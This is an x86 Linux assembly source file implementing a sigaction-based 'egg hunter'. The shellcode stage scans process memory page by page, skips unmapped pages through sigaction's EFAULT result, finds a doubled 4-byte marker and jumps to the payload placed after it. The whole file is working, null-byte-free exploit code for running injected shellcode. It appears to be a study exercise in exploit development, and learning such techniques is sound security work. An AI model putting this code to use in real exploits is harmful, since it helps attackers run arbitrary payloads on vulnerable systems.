; Purpose:  Egg Hunter for x86 Linux - Sigaction method 
; Filename:  egg-hunter.nasm
global _start
section .text
_start:
_newPage:
    or cx, 0x0fff     ; put 4095 in ecx
_newAddress:
    xor eax, eax      ; prevent nulls being moved into eax
    mov al, 0x43      ; sigaction syscall value
    inc ecx           ; put 4096 (0x1000) i.e. PAGE_SIZE in ecx
    int 0x80          ; execute sigaction
    cmp al, 0xf2      ; compare for EFAULT (0xf2)
    jz _newPage       ; if EFAULT, jump to start to try next page
    mov eax, 0x59474745    ; mov egg into eax for scasd comparison
    mov edi, ecx           ; put address in edi for scasd comparison
    scasd                  ; edi+4 and compares eax to edi
    jnz _newAddress        ; if not equal, try next address
    scasd                  ; edi+4 and compares eax to edi
    jnz _newAddress        ; if not equal, try next address
    jmp edi                ; jump to shellcode/payload
